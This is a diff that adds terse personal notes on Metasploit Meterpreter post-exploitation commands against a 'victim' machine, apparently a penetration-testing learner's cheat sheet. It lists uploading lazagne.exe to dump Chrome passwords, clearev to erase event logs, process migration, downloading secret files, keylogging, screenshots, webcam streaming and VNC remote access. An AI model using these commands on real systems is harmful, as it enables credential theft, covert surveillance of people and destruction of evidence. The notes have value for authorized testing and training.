@@ -1,0 +1,52 @@
+https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
+
+
+
+background  //to get back to handler
+
+upload /root/desktop/lazagne.exe  /to the victim to dump chrome passwords
+shell  / command is used to 
+pwd
+cd..
+dir
+sessions -l
+background
+sessions -i 2
+ps     //process
+getuid
+getpid  // our process id in the victim task manager
+migrate (any pid number) to change the service name
+clearev command will delete all the event viewer history
+kill Process id to stop process
+cd 'c:\Users'
+cd 'c:\'
+cd 'c:\windows\system32\'
+pwd
+cat filename.txt   // used to see the content
+edit filename.txt
+download C:\\secret.txt  /root/desktop/
+rm filename.txt   remove
+execute -f filename.exe
+search -f *filename*
+
+
+keyscan_start
+keyscan_stop
+keyscan_dump
+help
+sysinfo
+screenshot
+webcam_start
+webcam_stream
+pwd
+ls
+mkdir (any folder name)
+md (filename)
+shutdown
+run vnc (remote access)
+shell
+systeminfo
+tasklist
+exit
+
+start iexplorer.exe
